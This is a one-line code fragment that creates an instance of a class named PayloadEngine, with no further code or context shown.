engine = PayloadEngine()
